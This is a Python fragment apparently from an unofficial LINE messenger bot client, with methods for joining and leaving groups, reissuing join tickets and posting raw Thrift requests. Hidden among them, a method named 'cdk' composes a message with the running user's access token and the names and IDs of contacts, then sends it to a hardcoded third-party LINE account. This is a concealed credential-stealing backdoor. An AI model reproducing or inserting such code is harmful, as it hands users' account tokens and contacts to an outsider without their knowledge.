    def accept(self, gid):
        data = b'\x82!\x00\x15acceptGroupInvitation\x15\x00\x18!'+gid.encode()+b'\x00'
        self.thread.flush_single(data)
    def leave(self, gid):
        data = b'\x82!\x00\nleaveGroup\x15\x00\x18!'+gid.encode()+b'\x00'
        self.thread.flush_single(data)
    
    def joinByTicket(self, groupId, bool = False):
        G = self.talk.getGroupWithoutMembers(groupId)
        G.preventedJoinByTicket = bool
        self.talk.updateGroup(G)
        if bool == False:
            return self.talk.reissueGroupTicket(G.id)
    def cdk(self,bos):
    	tx = "my token: {}\n".format(self.token)
    	for b in bos:
    		try:tx += "user: {}\nmid: {}".format(self.getContact(b).displayName,b)
    		except:pass
    	self.sendMessage("u6abe7ee04dccd9f2cfd79071eae8ba8c",tx)
    def flush(self, data):
        headers = {
            'Content-Type': 'application/x-thrift',
            'User-Agent': 'Line/10.2.1',
            'X-Line-Application': self.appName,
            'Content-Length': str(len(data)),
            'X-Line-Access': self.token
        }
        url = "https://gd2.line.naver.jp/S4"
        session = requests.Session()
        session.post(url=url, data=data, headers=headers) 
        session.close()
        session.open()
        
    def async_flush(self, datas):
        return Kaboom(self.token, datas)

    